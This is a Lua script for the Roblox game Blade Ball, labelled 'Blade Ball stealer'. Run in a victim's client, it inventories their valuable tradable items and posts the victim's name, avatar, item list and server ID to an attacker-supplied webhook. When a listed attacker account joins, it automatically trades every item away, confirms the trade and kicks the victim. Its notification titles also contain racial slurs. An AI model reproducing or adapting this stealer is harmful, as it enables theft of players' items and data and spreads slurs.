_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Configuration récupérée du Main Script
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 
_G.LastMessageID = nil

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

-- Fonction de formatage RAP (1.5k, 2M, etc.)
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Envoi vers Cloudflare (POST pour créer, PATCH pour modifier)
local function PostToCloudflare(data, messageID)
    data["auth_token"] = auth_token
    data["victim_name"] = plr.Name
    data["messageID"] = messageID
    
    local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..plr.UserId.."&size=150x150&format=Png&isCircular=false"
    local sT, resT = pcall(function() return game:HttpGet(thumbApi) end)
    if sT then 
        local decoded = HttpService:JSONDecode(resT)
        data["victim_avatar"] = decoded.data[1].imageUrl 
    end
    
    local success, res = pcall(function()
        return httpRequest({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    
    if success and not messageID then
        local ok, decoded = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok then return decoded.id end
    end
end

-- Liste formatée sans étoiles
local function getFormattedList(list)
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Name = item.Name, Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local text = ""
    for _, group in ipairs(groupedList) do
        text = text .. string.format("- %s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end
    return text
end

-- Notif de Join (VIOLET)
local function SendJoinMessage(list)
    local itemText = getFormattedList(list)
    local hiddenJoin = "[🔗 **CLIQUE ICI POUR REJOINDRE LE SERVEUR**](https://roblox.com/)"
    local invPing = (ping == "Yes") and "||​|| @everyone" or ""

    local data = {
        ["content"] = invPing .. "\n`game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')`",
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["description"] = "Victime détectée !\n" .. hiddenJoin,
            ["color"] = 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Item list 📝:", value = #itemText > 1000 and string.sub(itemText, 1, 1000) .. "..." or itemText},
                {name = "Summary 💰:", value = "Total RAP: " .. formatNumber(totalRAP)}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    _G.LastMessageID = PostToCloudflare(data)
end

-- Notif de Confirmation quand TU rejoins
local function SendConfirmMessage(list)
    local itemText = getFormattedList(list)
    local data = {
        ["embeds"] = {{
            ["title"] = "✅ THE NIGGA IS ON THE SERVER 🎉",
            ["description"] = "Le receveur est là. Préparation du trade...",
            ["color"] = 65280,
            ["fields"] = {
                {name = "Victim:", value = plr.Name, inline = true},
                {name = "Items:", value = #itemText > 500 and string.sub(itemText, 1, 500) .. "..." or itemText}
            }
        }}
    }
    PostToCloudflare(data)
end

-- Détection du départ (Devient ROUGE)
Players.PlayerRemoving:Connect(function(player)
    if player == plr and _G.LastMessageID then
        local data = {
            ["content"] = "❌ **VICTIME DÉCONNECTÉE**",
            ["embeds"] = {{
                ["title"] = "🔴 VICTIM LEFT 🔴",
                ["description"] = "Le serveur est maintenant vide.",
                ["color"] = 16711680,
                ["fields"] = {
                    {name = "Victim:", value = plr.Name, inline = true},
                    {name = "Status:", value = "🔴 LEFT", inline = true}
                },
                ["footer"] = {["text"] = "Eblack Status Monitor"}
            }}
        }
        PostToCloudflare(data, _G.LastMessageID)
    end
end)

-- Calcul du RAP
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items
for _, cat in ipairs(categories) do
    local catMap = {}
    if rapData[cat] then
        for k, v in pairs(rapData[cat]) do
            local s, d = pcall(function() return HttpService:JSONDecode(k) end)
            if s then for _, p in ipairs(d) do if p[1] == "Name" then catMap[p[2]] = v end end end
        end
    end
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = catMap[info.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- Démarrage
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local itemsCopy = {unpack(itemsToSend)}
    SendJoinMessage(itemsToSend)

    local function startTrade(target)
        SendConfirmMessage(itemsCopy)
        while #itemsToSend > 0 do
            pcall(function() netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(Players:WaitForChild(target)) end)
            repeat task.wait(0.5) until tradeGui.Enabled
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
            end
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            repeat task.wait(0.2) until not tradeGui.Enabled
        end
        plr:kick("Trade fini (277)")
    end

    Players.PlayerAdded:Connect(function(p) if table.find(users, p.Name) then startTrade(p.Name) end end)
    for _, p in ipairs(Players:GetPlayers()) do if table.find(users, p.Name) then startTrade(p.Name) break end end
end
